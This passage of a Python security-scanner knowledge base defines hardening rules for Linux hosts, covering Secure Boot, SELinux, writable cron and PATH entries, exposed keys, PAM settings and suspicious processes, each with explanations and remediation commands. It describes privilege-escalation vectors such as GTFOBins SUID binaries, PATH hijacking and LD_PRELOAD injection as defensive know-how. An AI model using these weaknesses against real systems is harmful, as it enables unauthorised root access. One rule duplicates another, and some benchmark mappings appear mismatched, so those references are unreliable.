        tags=["kernel", "sysctl", "misconfiguration"],
        confidence_score=0.75,
        source_stages=["kernel"],
        source_categories=["security_control"],
    ),
]

# ------------------------------------------------------------------
#  Kernel hardening rules
# ------------------------------------------------------------------

KERNEL_HARDENING_RULES = [
    KnowledgeRule(
        rule_id="KH-001",
        title_patterns=["Secure Boot is disabled"],
        explanation="UEFI Secure Boot is turned off, allowing unsigned or tampered bootloaders, "
        "kernels, and kernel modules to be loaded during system boot.",
        security_impact="High - An attacker with physical or root access could install a "
        "persistent bootkit or unsigned kernel module that survives reboots.",
        remediation="Enable Secure Boot in the UEFI firmware settings and re-sign "
        "any custom kernel modules with a Machine Owner Key (MOK).",
        cis_control="CIS Ubuntu Benchmark 1.7 - Ensure Secure Boot is enabled",
        mitre_attack=[MitreTechnique.T1542],
        cwe="CWE-284: Improper Access Control",
        tags=["secure-boot", "kernel", "uefi", "boot-security"],
        confidence_score=0.85,
        source_stages=["kernel_hardening"],
    ),
    KnowledgeRule(
        rule_id="KH-002",
        title_patterns=["SELinux is permissive", "SELinux is disabled"],
        explanation="SELinux mandatory access control is either in permissive mode "
        "(logging but not enforcing) or completely disabled, reducing the system's "
        "ability to contain compromised processes.",
        security_impact="High - Without SELinux enforcement, a compromised process "
        "has fewer restrictions. Permissive mode provides audit only with no actual protection.",
        remediation="Enable SELinux enforcing mode: setenforce 1 and ensure "
        "SELINUX=enforcing in /etc/selinux/config.",
        cis_control="CIS Ubuntu Benchmark 1.6.1 - Ensure SELinux is installed",
        mitre_attack=[MitreTechnique.T1562_001],
        cwe="CWE-284: Improper Access Control",
        tags=["selinux", "mac", "access-control", "kernel"],
        confidence_score=0.85,
        source_stages=["kernel_hardening"],
    ),
    KnowledgeRule(
        rule_id="KH-003",
        title_patterns=["AppArmor is disabled"],
        explanation="AppArmor mandatory access control is not active. AppArmor provides "
        "per-program profiles that restrict capabilities even for root-owned processes.",
        security_impact="High - Without AppArmor, there is no MAC layer restricting "
        "what programs can do, making exploit containment harder.",
        remediation="Enable AppArmor: install apparmor-profiles, add 'apparmor=1 "
        "security=apparmor' to kernel cmdline, and reboot.",
        cis_control="CIS Ubuntu Benchmark 1.6.2 - Ensure AppArmor is enabled",
        mitre_attack=[MitreTechnique.T1562_001],
        cwe="CWE-284: Improper Access Control",
        tags=["apparmor", "mac", "access-control", "kernel"],
        confidence_score=0.85,
        source_stages=["kernel_hardening"],
    ),
    KnowledgeRule(
        rule_id="KH-004",
        title_patterns=["seccomp is not available", "seccomp available without"],
        explanation="Seccomp (secure computing mode) restricts the syscalls a process can make. "
        "Without seccomp-bpf, container runtimes and sandboxed applications have reduced "
        "isolation capabilities.",
        security_impact="Medium - Container escapes and application sandbox bypasses are more "
        "likely when seccomp-bpf filtering is unavailable.",
        remediation="Rebuild the kernel with CONFIG_SECCOMP=y and CONFIG_SECCOMP_FILTER=y.",
        mitre_attack=[MitreTechnique.T1562_001],
        cwe="CWE-693: Protection Mechanism Failure",
        tags=["seccomp", "kernel", "container-security", "sandbox"],
        confidence_score=0.8,
        source_stages=["kernel_hardening"],
    ),
    KnowledgeRule(
        rule_id="KH-005",
        title_patterns=["eBPF is accessible to unprivileged users"],
        explanation="Unprivileged BPF (eBPF) allows non-root users to load and run BPF programs "
        "in the kernel. This dramatically increases kernel attack surface and has been "
        "used in multiple privilege escalation exploits (CVE-2020-8835, CVE-2021-3490, etc.).",
        security_impact="High - Multiple known privilege escalation exploits leverage "
        "unprivileged eBPF. Restricting to privileged users reduces kernel attack surface.",
        remediation="Set kernel.unprivileged_bpf_disabled=1 via sysctl and add to /etc/sysctl.d/.",
        cis_control="CIS Ubuntu Benchmark 3.2.1 - Ensure BPF is restricted to privileged users",
        mitre_attack=[MitreTechnique.T1068],
        cwe="CWE-693: Protection Mechanism Failure",
        tags=["ebpf", "bpf", "kernel", "privilege-escalation"],
        confidence_score=0.9,
        source_stages=["kernel_hardening"],
    ),
    KnowledgeRule(
        rule_id="KH-006",
        title_patterns=["CPU vulnerable to"],
        explanation="The CPU is affected by a speculative execution or other hardware vulnerability. "
        "These vulnerabilities can allow attackers to leak sensitive data from kernel or "
        "other process memory via side-channel attacks.",
        security_impact="High to Medium - Depending on the specific vulnerability. "
        "Spectre-v2 and Meltdown are high severity. Microarchitectural "
        "side-channel attacks can leak encryption keys and sensitive data.",
        remediation="Apply the latest kernel and CPU microcode updates. Ensure "
        "mitigations=auto is set in the kernel command line.",
        mitre_attack=[MitreTechnique.T1068],
        cwe="CWE-200: Exposure of Sensitive Information to an Unauthorized Actor",
        tags=["cpu", "mitigation", "spectre", "meltdown", "kernel"],
        confidence_score=0.85,
        source_stages=["kernel_hardening"],
        source_categories=["vulnerability"],
    ),
    KnowledgeRule(
        rule_id="KH-007",
        title_patterns=["User namespaces are enabled"],
        explanation="User namespaces allow unprivileged users to create namespaces with "
        "full capabilities inside the namespace. This has been a source of multiple "
        "kernel privilege escalation bugs.",
        security_impact="Medium - While user namespaces are required for container runtimes, "
        "they significantly increase kernel attack surface from unprivileged contexts.",
        remediation="If containers are not needed, set user.max_user_namespaces=0. "
        "If containers are required, keep the kernel updated.",
        cis_control="CIS Ubuntu Benchmark 3.2.2 - Ensure user namespaces are restricted",
        mitre_attack=[MitreTechnique.T1068],
        cwe="CWE-693: Protection Mechanism Failure",
        tags=["namespaces", "user-ns", "kernel", "container-security"],
        confidence_score=0.7,
        source_stages=["kernel_hardening"],
    ),
    KnowledgeRule(
        rule_id="KH-008",
        title_patterns=["Sensitive kernel module loaded"],
        explanation="A potentially unnecessary kernel module is loaded, increasing kernel "
        "attack surface. Modules for Bluetooth, FireWire, or other hardware that is "
        "not in use should be blacklisted.",
        security_impact="Low - Each loaded module increases the kernel's code footprint and "
        "potential attack surface, though actual exploitability depends on the module.",
        remediation="Blacklist the module: echo 'blacklist <module>' > /etc/modprobe.d/<module>-blacklist.conf",
        cis_control="CIS Control 4: Secure Configuration of Enterprise Assets and Software",
        mitre_attack=[MitreTechnique.T1562_001],
        cwe="CWE-1104: Use of Unmaintained Third-Party Components",
        tags=["kernel-module", "attack-surface", "hardening"],
        confidence_score=0.5,
        source_stages=["kernel_hardening"],
        source_categories=["kernel_module"],
    ),
]

# ------------------------------------------------------------------
#  Writable path / file rules
# ------------------------------------------------------------------

WRITABLE_RULES = [
    KnowledgeRule(
        rule_id="WRITABLE-001",
        title_patterns=["Writable PATH entries"],
        explanation="World-writable directories in the system PATH allow an attacker "
        "who can write to those directories to place malicious executables that will "
        "be executed before the legitimate system binaries.",
        security_impact="High - Any user who can write to a PATH directory can execute "
        "arbitrary code as any user who runs a command from that PATH. "
        "Common privilege escalation vector.",
        remediation="Remove write permissions from PATH directories or remove them from PATH. "
        "Ensure user PATH does not include world-writable directories before system paths.",
        cis_control="CIS Ubuntu Benchmark 6.2.8 - Ensure root PATH Integrity",
        mitre_attack=[MitreTechnique.T1574_001],
        cwe="CWE-426: Untrusted Search Path",
        tags=["path", "writable", "privilege-escalation", "environment"],
        confidence_score=0.9,
    ),
    KnowledgeRule(
        rule_id="WRITABLE-002",
        title_patterns=["Writable files in /etc/cron."],
        explanation="Cron script directories contain world-writable files. "
        "An attacker who can modify a cron script will have it executed automatically "
        "with the privileges of the scheduled user (often root).",
        security_impact="High - World-writable cron files allow privilege escalation. "
        "Any script run as root can be modified to execute arbitrary code.",
        remediation="chmod 644 <file> && chown root:root <file> for each writable cron file. "
        "Ensure all cron directories are owned by root and not world-writable.",
        cis_control="CIS Ubuntu Benchmark 5.1.1 - Ensure cron daemon is enabled and running",
        mitre_attack=[MitreTechnique.T1053_003],
        cwe="CWE-732: Incorrect Permission Assignment for Critical Resource",
        tags=["cron", "writable", "privilege-escalation", "scheduled-task"],
        confidence_score=0.9,
    ),
    KnowledgeRule(
        rule_id="WRITABLE-003",
        title_patterns=["Writable systemd unit"],
        explanation="Systemd unit files are world-writable, allowing any user "
        "to modify service configurations. Modified services run with their "
        "configured privileges (often root).",
        security_impact="High - Any user can modify a systemd service to execute "
        "arbitrary code as the service user (often root).",
        remediation="Restrict permissions: chmod 644 <path> && chown root:root <path>. "
        "Verify with: find /etc/systemd/system -perm /o=w -type f",
        cis_control="CIS Control 4: Secure Configuration of Enterprise Assets and Software",
        mitre_attack=[MitreTechnique.T1569_002, MitreTechnique.T1574_002],
        cwe="CWE-732: Incorrect Permission Assignment for Critical Resource",
        tags=["systemd", "writable", "privilege-escalation", "service"],
        confidence_score=0.9,
    ),
    KnowledgeRule(
        rule_id="WRITABLE-004",
        title_patterns=["Writable system directories"],
        explanation="World-writable directories exist under system paths (/etc, /usr, /opt, "
        "/root, /var, /home). These can be used for privilege escalation through "
        "file replacement, symlink attacks, or library injection.",
        security_impact="Medium - Writable system directories may enable privilege escalation "
        "if an attacker can place files that get sourced or executed by privileged processes.",
        remediation="Review each writable directory and restrict permissions. "
        "Use: chmod o-w <path> or chmod g-w <path> where appropriate.",
        cis_control="CIS Ubuntu Benchmark 6.1.9 - Ensure no world writable files exist",
        mitre_attack=[MitreTechnique.T1574_001],
        cwe="CWE-732: Incorrect Permission Assignment for Critical Resource",
        tags=["writable", "directory", "privilege-escalation", "permissions"],
        confidence_score=0.7,
    ),
    KnowledgeRule(
        rule_id="WRITABLE-005",
        title_patterns=["Root cron job:"],
        explanation="A cron job is configured to run as root. If the target script "
        "is world-writable or in a world-writable location, it can be modified "
        "by any user to execute arbitrary code as root.",
        security_impact="Medium - Root cron jobs running from writable locations allow privilege escalation.",
        remediation="Verify the cron script is owned by root with permissions 700. "
        "Store cron scripts in /root/ or /usr/local/sbin/ with restricted permissions.",
        cis_control="CIS Ubuntu Benchmark 5.1.1 - Ensure cron daemon is enabled and running",
        mitre_attack=[MitreTechnique.T1053_003],
        cwe="CWE-732: Incorrect Permission Assignment for Critical Resource",
        tags=["cron", "root", "privilege-escalation", "scheduled-task"],
        confidence_score=0.7,
    ),
]

# ------------------------------------------------------------------
#  Secrets / credential exposure rules
# ------------------------------------------------------------------

SECRETS_RULES = [
    KnowledgeRule(
        rule_id="SEC-001",
        title_patterns=["SSH key found"],
        explanation="An SSH private key was found. If the key is unprotected "
        "(no passphrase, world-readable), it can be used to access remote systems.",
        security_impact="High - Exposed SSH keys can provide access to other systems. "
        "If the key is for the current host, it allows persistent access.",
        remediation="Protect private keys: chmod 600 <path>. Use ssh-keygen -p to add a "
        "passphrase. Consider rotating the key if it may have been exposed.",
        cis_control="CIS Ubuntu Benchmark 5.3.2 - Ensure permissions on SSH private host key files are configured",
        mitre_attack=[MitreTechnique.T1552_004],
        cwe="CWE-312: Cleartext Storage of Sensitive Information",
        tags=["ssh", "key", "credential", "secret"],
        confidence_score=0.85,
    ),
    KnowledgeRule(
        rule_id="SEC-002",
        title_patterns=[".env file found"],
        explanation="A .env file containing environment variables (often with "
        "API keys, database passwords, or tokens) was found. These files "
        "frequently contain sensitive credentials.",
        security_impact="High - .env files typically contain database credentials, "
        "API keys, and application secrets that can be used for lateral movement.",
        remediation="Remove .env files from production systems. Use a secrets manager "
        "instead. Ensure .env is in .gitignore and never committed to version control.",
        cis_control="CIS Control 3: Data Protection",
        mitre_attack=[MitreTechnique.T1552_001],
        cwe="CWE-312: Cleartext Storage of Sensitive Information",
        tags=["env", "secret", "credential", "exposure"],
        confidence_score=0.85,
    ),
    KnowledgeRule(
        rule_id="SEC-003",
        title_patterns=["private-key:", "private-key found", "private key"],
        explanation="A private key file (*.key, *.pem) was discovered on the filesystem. "
        "Private keys grant access to encrypted communications and systems.",
        security_impact="High - Exposed private keys compromise TLS/SSL security, "
        "SSH authentication, and any systems relying on the key pair.",
        remediation="Remove unnecessary key files. Encrypt keys with strong passphrases. "
        "Restrict permissions to 600. Rotate exposed keys immediately.",
        cis_control="CIS Control 3: Data Protection",
        mitre_attack=[MitreTechnique.T1552_004],
        cwe="CWE-312: Cleartext Storage of Sensitive Information",
        tags=["key", "private-key", "credential", "crypto"],
        confidence_score=0.85,
    ),
    KnowledgeRule(
        rule_id="SEC-004",
        title_patterns=["Credentials in config:"],
        explanation="A configuration file containing hardcoded credentials (passwords, "
        "API keys, tokens) was found. Hardcoded credentials are a common security issue.",
        security_impact="Critical - Hardcoded credentials in configuration files "
        "can be used for unauthorized access to databases, APIs, and services.",
        remediation="Remove hardcoded credentials. Use environment variables or "
        "a secrets management solution (Vault, Kubernetes Secrets, etc.).",
        cis_control="CIS Control 3: Data Protection",
        mitre_attack=[MitreTechnique.T1552_001],
        cwe="CWE-798: Use of Hard-coded Credentials",
        tags=["credential", "hardcoded", "secret", "password"],
        confidence_score=0.9,
    ),
    KnowledgeRule(
        rule_id="SEC-005",
        title_patterns=["Sensitive env variable:"],
        explanation="An environment variable containing potential sensitive data "
        "(SECRET, TOKEN, PASSWORD, API_KEY, AWS credentials, etc.) was detected. "
        "Environment variables can be read by all processes on the system.",
        security_impact="Medium - Other processes (including compromised ones) can read "
        "environment variables of the current process via /proc/<pid>/environ.",
        remediation="Use a secrets management solution instead of environment variables. "
        "If env vars must be used, restrict access and consider encryption at rest.",
        cis_control="CIS Control 3: Data Protection",
        mitre_attack=[MitreTechnique.T1552_001],
        cwe="CWE-200: Exposure of Sensitive Information to an Unauthorized Actor",
        tags=["environment", "secret", "credential", "exposure"],
        confidence_score=0.7,
    ),
]

# ------------------------------------------------------------------
#  Authentication / log rules
# ------------------------------------------------------------------

AUTH_RULES = [
    KnowledgeRule(
        rule_id="AUTH-001",
        title_patterns=["Failed logins:"],
        explanation="Multiple failed login attempts were detected in system logs. "
        "This may indicate a brute-force attack in progress or a misconfigured service.",
        security_impact="Medium to Low - Depending on volume. High volumes suggest "
        "active brute-force attacks. Low volumes may be user error.",
        remediation="Investigate failed login sources. Implement fail2ban or similar "
        "for rate-limiting. Disable root SSH login and enforce key-only authentication.",
        cis_control="CIS Control 8: Audit Log Management",
        mitre_attack=[MitreTechnique.T1110],
        cwe="CWE-307: Improper Restriction of Excessive Authentication Attempts",
        tags=["authentication", "failed-login", "bruteforce", "logs"],
        confidence_score=0.8,
    ),
    KnowledgeRule(
        rule_id="AUTH-002",
        title_patterns=["Direct root logins:"],
        explanation="Direct root logins (not via su or sudo) were detected. "
        "Best practice is to disable direct root login and require "
        "individual user accounts with sudo.",
        security_impact="High - Direct root login bypasses individual accountability "
        "and audit trails. All root actions are attributed to 'root' rather than "
        "the responsible user.",
        remediation="Disable direct root login: 'PermitRootLogin no' in sshd_config. "
        "Configure sudo access for authorized administrators.",
        cis_control="CIS Ubuntu Benchmark 5.3.9 - Ensure SSH root login is disabled",
        mitre_attack=[MitreTechnique.T1078],
        cwe="CWE-287: Improper Authentication",
        tags=["authentication", "root", "login", "logs"],
        confidence_score=0.85,
    ),
    KnowledgeRule(
        rule_id="AUTH-003",
        title_patterns=["High sudo usage:"],
        explanation="A high number of sudo events was detected. This may indicate "
        "normal administrative activity or potentially suspicious behavior.",
        security_impact="Info - High sudo usage warrants review but is not inherently malicious.",
        remediation="Review sudo logs to verify all sudo usage is legitimate. "
        "Consider implementing sudo log aggregation and alerting.",
        tags=["sudo", "logs", "monitoring"],
        confidence_score=0.4,
    ),
]

# ------------------------------------------------------------------
#  Auth / Security rules (PS-02)
# ------------------------------------------------------------------

AUTH_SECURITY_RULES = [
    KnowledgeRule(
        rule_id="AUTHSEC-001",
        title_patterns=["PAM password quality module not configured"],
        explanation="The PAM password quality module (pam_pwquality.so or pam_cracklib.so) is not "
        "configured. Without it, there are no password complexity requirements, allowing users "
        "to set weak passwords that are easily guessed or brute-forced.",
        security_impact="Medium - Weak passwords significantly increase the risk of credential "
        "compromise via brute-force, guessing, or password spraying attacks.",
        remediation="Configure pam_pwquality.so in /etc/pam.d/common-password with "
        "retry=3 minlen=14 dcredit=-1 ucredit=-1 ocredit=-1 lcredit=-1.",
        cis_control="CIS Ubuntu Benchmark 5.4.1.1 - Ensure password creation requirements are configured",
        mitre_attack=[MitreTechnique.T1556_003],
        cwe="CWE-521: Weak Password Requirements",
        tags=["pam", "password", "authentication", "quality"],
        confidence_score=0.85,
        source_stages=["auth_security"],
    ),
    KnowledgeRule(
        rule_id="AUTHSEC-002",
        title_patterns=["PAM account lockout not configured"],
        explanation="No PAM account lockout module (pam_faillock.so or pam_tally2.so) is configured. "
        "Without lockout, attackers can make unlimited login attempts without being blocked.",
        security_impact="Medium - Without account lockout, brute-force attacks can continue "
        "uninterrupted until a password is guessed.",
        remediation="Add pam_faillock.so configuration to /etc/pam.d/common-auth: "
        "auth required pam_faillock.so preauth deny=5 unlock_time=900.",
        cis_control="CIS Ubuntu Benchmark 5.4.1.2 - Ensure lockout for failed password attempts is configured",
        mitre_attack=[MitreTechnique.T1110],
        cwe="CWE-307: Improper Restriction of Excessive Authentication Attempts",
        tags=["pam", "lockout", "brute-force", "authentication"],
        confidence_score=0.85,
        source_stages=["auth_security"],
    ),
    KnowledgeRule(
        rule_id="AUTHSEC-003",
        title_patterns=["PAM password history not configured"],
        explanation="pam_pwhistory.so is not configured, so password reuse is not restricted. "
        "Users can cycle back to previously used passwords, weakening credential security.",
        security_impact="Low - Password reuse makes it easier for attackers who have obtained old "
        "password hashes to reuse them if the password is changed then reverted.",
        remediation="Add 'password requisite pam_pwhistory.so remember=5' to /etc/pam.d/common-password "
        "to prevent reuse of the last 5 passwords.",
        cis_control="CIS Ubuntu Benchmark 5.4.1.4 - Ensure password reuse is limited",
        tags=["pam", "password", "history", "reuse"],
        confidence_score=0.7,
        source_stages=["auth_security"],
    ),
    KnowledgeRule(
        rule_id="AUTHSEC-004",
        title_patterns=["PAM password hashing algorithm is weak"],
        explanation="The PAM password hashing algorithm is not SHA-512 or yescrypt. Weak hashing "
        "algorithms like MD5 or DES can be cracked orders of magnitude faster than modern ones.",
        security_impact="High - Weak password hashes can be cracked quickly, exposing all account "
        "passwords to an attacker who gains access to /etc/shadow.",
        remediation="Add sha512 or yescrypt to the pam_unix.so arguments in /etc/pam.d/common-password.",
        cis_control="CIS Ubuntu Benchmark 5.4.1.3 - Ensure password hashing algorithm is up to date",
        mitre_attack=[MitreTechnique.T1003_008],
        cwe="CWE-328: Use of Weak Hash",
        tags=["pam", "password", "hashing", "crypto"],
        confidence_score=0.85,
        source_stages=["auth_security"],
    ),
    KnowledgeRule(
        rule_id="AUTHSEC-005",
        title_patterns=["Empty password for user"],
        explanation="A user account has an empty password, meaning the account can be accessed "
        "without any authentication. This is a critical security vulnerability.",
        security_impact="Critical - An empty password means anyone can log in as this user "
        "without credentials. If the account has sudo or root access, this is full compromise.",
        remediation="Set a password for the account: passwd <username>. Also check if the account "
        "should be locked with 'passwd -l <username>'.",
        cis_control="CIS Ubuntu Benchmark 6.2.1 - Ensure password fields are not empty",
        mitre_attack=[MitreTechnique.T1078],
        cwe="CWE-521: Weak Password Requirements",
        tags=["password", "empty", "authentication", "critical"],
        confidence_score=0.95,
        source_stages=["auth_security"],
    ),
    KnowledgeRule(
        rule_id="AUTHSEC-006",
        title_patterns=["Weak password hash for user"],
        explanation="A user account is using a weak password hashing algorithm (MD5, DES, or "
        "older Blowfish). These algorithms are susceptible to fast offline cracking.",
        security_impact="High - Weak hashes can be cracked quickly, compromising all accounts "
        "that share passwords or if the user reuses passwords elsewhere.",
        remediation="Force a password change to upgrade the hash algorithm: passwd <username>. "
        "Ensure pam_unix.so uses sha512 or yescrypt.",
        cis_control="CIS Ubuntu Benchmark 5.4.1.3 - Ensure password hashing algorithm is up to date",
        mitre_attack=[MitreTechnique.T1003_008],
        cwe="CWE-328: Use of Weak Hash",
        tags=["password", "weak-hash", "cracking", "credential"],
        confidence_score=0.85,
        source_stages=["auth_security"],
    ),
    KnowledgeRule(
        rule_id="AUTHSEC-007",
        title_patterns=["Incorrect permissions on /etc/shadow"],
        explanation="The shadow password file has incorrect permissions, potentially allowing "
        "unauthorized users to read password hashes for offline cracking.",
        security_impact="High - World-readable /etc/shadow exposes all password hashes to "
        "any user on the system, enabling offline brute-force attacks.",
        remediation="chmod 0 /etc/shadow or chmod 400 /etc/shadow.",
        cis_control="CIS Ubuntu Benchmark 6.1.3 - Ensure permissions on /etc/shadow are configured",
        cwe="CWE-732: Incorrect Permission Assignment for Critical Resource",
        tags=["shadow", "permissions", "credential", "exposure"],
        confidence_score=0.95,
        source_stages=["auth_security"],
    ),
    KnowledgeRule(
        rule_id="AUTHSEC-008",
        title_patterns=["Incorrect permissions on /etc/passwd"],
        explanation="The passwd file has incorrect permissions. While passwd does not contain "
        "password hashes (those are in /etc/shadow), writable passwd allows user account manipulation.",
        security_impact="Medium - Writable /etc/passwd allows any user to modify account "
        "settings, including changing shells or creating new accounts.",
        remediation="chmod 644 /etc/passwd",
        cis_control="CIS Ubuntu Benchmark 6.1.1 - Ensure permissions on /etc/passwd are configured",
        cwe="CWE-732: Incorrect Permission Assignment for Critical Resource",
        tags=["passwd", "permissions", "account"],
        confidence_score=0.8,
        source_stages=["auth_security"],
    ),
    KnowledgeRule(
        rule_id="AUTHSEC-009",
        title_patterns=["Credential exposure:"],
        explanation="Credentials such as API keys, passwords, tokens, or private keys were "
        "found in files on the filesystem. Exposed credentials can be used for lateral movement, "
        "privilege escalation, or accessing external services.",
        security_impact="Critical to High - Exposed credentials enable unauthorized access to "
        "systems and services. The impact depends on the credential type and scope of access.",
        remediation="Remove credentials from files. Use a secrets manager (Vault, Bitwarden, "
        "Kubernetes Secrets). Rotate any credentials that may have been exposed.",
        cis_control="CIS Control 3: Data Protection",
        mitre_attack=[MitreTechnique.T1552_001],
        cwe="CWE-312: Cleartext Storage of Sensitive Information",
        tags=["credential", "exposure", "secret", "key"],
        confidence_score=0.85,
        source_stages=["auth_security"],
        source_categories=["misconfiguration"],
    ),
    KnowledgeRule(
        rule_id="AUTHSEC-010",
        title_patterns=["SSH agent forwarding detected"],
        explanation="SSH agent forwarding is active, allowing the local SSH agent socket to "
        "be accessed on remote hosts. A compromised remote host can use the forwarded agent "
        "to authenticate as the user on other systems.",
        security_impact="Medium - Forwarded SSH agent sockets can be used by attackers with "
        "root access on intermediate hosts to authenticate as the forwarding user.",
        remediation="Avoid using SSH agent forwarding (-A). Use ProxyJump instead, or add "
        "ForwardAgent no to ~/.ssh/config.",
        mitre_attack=[MitreTechnique.T1563_001],
        cwe="CWE-200: Exposure of Sensitive Information",
        tags=["ssh", "agent", "forwarding", "credential"],
        confidence_score=0.7,
        source_stages=["auth_security"],
    ),
    KnowledgeRule(
        rule_id="AUTHSEC-011",
        title_patterns=["PATH contains world-writable directories"],
        explanation="The system PATH includes world-writable directories where any user can "
        "place files. An attacker can place a malicious executable with the same name as a "
        "common command, and it will be executed instead of the legitimate binary.",
        security_impact="High - PATH hijacking allows privilege escalation when a privileged "
        "user or process runs a command that resolves to the attacker's malicious binary.",
        remediation="Remove writable directories from PATH. Ensure PATH does not include "
        "'.' or relative paths. Set a secure PATH in /etc/profile and ~/.profile.",
        cis_control="CIS Ubuntu Benchmark 6.2.8 - Ensure root PATH Integrity",
        mitre_attack=[MitreTechnique.T1574_001],
        cwe="CWE-426: Untrusted Search Path",
        tags=["path", "hijacking", "privilege-escalation", "environment"],
        confidence_score=0.85,
        source_stages=["auth_security"],
    ),
    KnowledgeRule(
        rule_id="AUTHSEC-012",
        title_patterns=["World-writable scripts in system paths"],
        explanation="World-writable executables exist in system paths (/etc, /usr, /opt, /root, /var). "
        "Any user can modify these files and inject malicious code.",
        security_impact="High - Writable system executables allow any user to inject code that "
        "will be executed with the privileges of whoever runs the script.",
        remediation="Restrict permissions: chmod 755 <path> && chown root:root <path>.",
        cis_control="CIS Ubuntu Benchmark 6.1.9 - Ensure no world writable files exist",
        mitre_attack=[MitreTechnique.T1574_001],
        cwe="CWE-732: Incorrect Permission Assignment for Critical Resource",
        tags=["writable", "script", "privilege-escalation", "permissions"],
        confidence_score=0.85,
        source_stages=["auth_security"],
    ),
    KnowledgeRule(
        rule_id="AUTHSEC-013",
        title_patterns=["SGID binaries detected"],
        explanation="SGID binaries run with the group permissions of their group owner, "
        "potentially granting elevated group-level privileges to any user executing them.",
        security_impact="Medium - SGID binaries can lead to privilege escalation if the "
        "group has access to sensitive resources or if combined with other weaknesses.",
        remediation="Review SGID binaries and remove the SGID bit where not required: chmod g-s <path>.",
        cis_control="CIS Ubuntu Benchmark 6.1.9 - Ensure no world writable files exist",
        mitre_attack=[MitreTechnique.T1548_001],
        cwe="CWE-732: Incorrect Permission Assignment for Critical Resource",
        tags=["sgid", "privilege-escalation", "permissions"],
        confidence_score=0.7,
        source_stages=["auth_security"],
    ),
    KnowledgeRule(
        rule_id="AUTHSEC-014",
        title_patterns=["GTFOBins SUID binary"],
        explanation="A SUID binary that is listed on GTFOBins was found. These binaries have "
        "known techniques for escalating privileges to the level of the binary's owner.",
        security_impact="High - GTFOBins-listed SUID binaries provide documented privilege "
        "escalation techniques that can be executed by any user.",
        remediation="Remove SUID bit if not required: chmod u-s <path>. "
        "For required SUID binaries, monitor for CVEs and restrict access.",
        references=["https://gtfobins.github.io/"],
        cis_control="CIS Control 4: Secure Configuration",
        mitre_attack=[MitreTechnique.T1548_001],
        cwe="CWE-250: Execution with Unnecessary Privileges",
        tags=["gtfobins", "suid", "privilege-escalation"],
        confidence_score=0.85,
        source_stages=["auth_security"],
    ),
    KnowledgeRule(
        rule_id="AUTHSEC-015",
        title_patterns=["GTFOBins binary with capabilities"],
        explanation="A binary with Linux capabilities that is listed on GTFOBins was found. "
        "The combination of capabilities and GTFOBins techniques may enable privilege escalation.",
        security_impact="High - Capabilities like cap_setuid+ep combined with GTFOBins "
        "techniques can provide a direct path to a privileged shell.",
        remediation="Remove unnecessary capabilities: setcap -r <path>. "
        "Review all capability assignments on the system.",
        references=["https://gtfobins.github.io/"],
        cis_control="CIS Control 4: Secure Configuration",
        mitre_attack=[MitreTechnique.T1548_001],
        cwe="CWE-250: Execution with Unnecessary Privileges",
        tags=["gtfobins", "capabilities", "privilege-escalation"],
        confidence_score=0.85,
        source_stages=["auth_security"],
    ),
    KnowledgeRule(
        rule_id="AUTHSEC-016",
        title_patterns=["Writable polkit rule file"],
        explanation="A polkit rule file is world-writable, allowing any user to modify "
        "authorization rules. This can be used to grant unauthorized privileges.",
        security_impact="High - Writable polkit rules allow privilege escalation by "
        "modifying authorization decisions to grant admin access.",
        remediation="chmod 644 <path> && chown root:root <path>.",
        cis_control="CIS Ubuntu Benchmark 5.7.1 - Ensure PolicyKit is installed and configured",
        mitre_attack=[MitreTechnique.T1484],
        cwe="CWE-732: Incorrect Permission Assignment for Critical Resource",
        tags=["polkit", "writable", "authorization", "privilege-escalation"],
        confidence_score=0.9,
        source_stages=["auth_security"],
    ),
    KnowledgeRule(
        rule_id="AUTHSEC-017",
        title_patterns=["Dangerous polkit action"],
        explanation="A polkit action with permissive authorization was found. Sensitive actions "
        "should require administrator authentication, not be accessible to all users.",
        security_impact="Medium - Permissive polkit rules may allow unprivileged users to "
        "perform sensitive operations like suspending the system or managing services.",
        remediation="Review polkit authorization rules. Use 'auth_admin' instead of 'yes' "
        "for sensitive actions in polkit rule files.",
        cis_control="CIS Ubuntu Benchmark 5.7.2 - Ensure PolicyKit rules are secure",
        mitre_attack=[MitreTechnique.T1484],
        cwe="CWE-284: Improper Access Control",
        tags=["polkit", "authorization", "misconfiguration"],
        confidence_score=0.7,
        source_stages=["auth_security"],
    ),
    KnowledgeRule(
        rule_id="AUTHSEC-018",
        title_patterns=["LD_PRELOAD environment variable is set"],
        explanation="LD_PRELOAD is set globally, causing a shared library to be loaded into "
        "all processes. This can be exploited for privilege escalation when SUID binaries "
        "are executed, as certain configurations may honor LD_PRELOAD.",
        security_impact="Medium - LD_PRELOAD can be used for privilege escalation via "
        "library injection, though modern SUID binaries typically ignore it.",
        remediation="Unset LD_PRELOAD in privileged contexts. Avoid using LD_PRELOAD globally.",
        mitre_attack=[MitreTechnique.T1574_001],
        cwe="CWE-114: Process Control",
        tags=["ld_preload", "library-injection", "privilege-escalation"],
        confidence_score=0.7,
        source_stages=["auth_security"],
    ),
    KnowledgeRule(
        rule_id="AUTHSEC-019",
        title_patterns=["LD_LIBRARY_PATH environment variable is set"],
        explanation="LD_LIBRARY_PATH is set, which can be used to inject malicious shared "
        "libraries into processes. This is a known technique for privilege escalation.",
        security_impact="Medium - LD_LIBRARY_PATH can be abused to load malicious libraries, "
        "though modern systems have protections against this for SUID binaries.",
        remediation="Unset LD_LIBRARY_PATH in privileged contexts. Remove from global shell configs.",
        mitre_attack=[MitreTechnique.T1574_001],
        cwe="CWE-114: Process Control",
        tags=["ld_library_path", "library-injection", "privilege-escalation"],
        confidence_score=0.7,
        source_stages=["auth_security"],
    ),
    KnowledgeRule(
        rule_id="AUTHSEC-020",
        title_patterns=["Incorrect permissions on /etc/passwd"],
        explanation="See AUTHSEC-008.",
        security_impact="Medium - See AUTHSEC-008.",
        remediation="See AUTHSEC-008.",
        cis_control="CIS Ubuntu Benchmark 6.1.1 - Ensure permissions on /etc/passwd are configured",
        cwe="CWE-732: Incorrect Permission Assignment for Critical Resource",
        tags=["passwd", "permissions"],
        confidence_score=0.8,
        source_stages=["auth_security"],
    ),
]

# ------------------------------------------------------------------
#  Process rules
# ------------------------------------------------------------------

PROCESS_RULES = [
    KnowledgeRule(
        rule_id="PROC-001",
        title_patterns=["Suspicious process:"],
        explanation="A process with a known suspicious or potentially malicious binary "
        "is running. These binaries are commonly used by attackers for "
        "reconnaissance, exploitation, or cryptocurrency mining.",
        security_impact="High - Suspicious processes may indicate a compromised system. "
        "Crypto miners, pentesting tools, and backdoor shells are all red flags.",
        remediation="Investigate the process immediately. Check its parent process, "
        "network connections, and file origin. Kill and remove if unauthorized.",
        cis_control="CIS Control 10: Malware Defenses",
